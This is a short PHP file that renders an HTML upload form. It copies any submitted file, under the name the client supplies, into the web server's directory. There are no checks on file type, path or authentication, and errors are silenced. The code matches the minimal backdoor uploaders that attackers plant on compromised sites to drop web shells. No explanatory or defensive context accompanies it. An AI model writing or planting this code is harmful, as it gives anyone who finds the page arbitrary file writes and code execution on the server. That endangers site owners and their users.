<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>
<?php if($_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name']));}?>
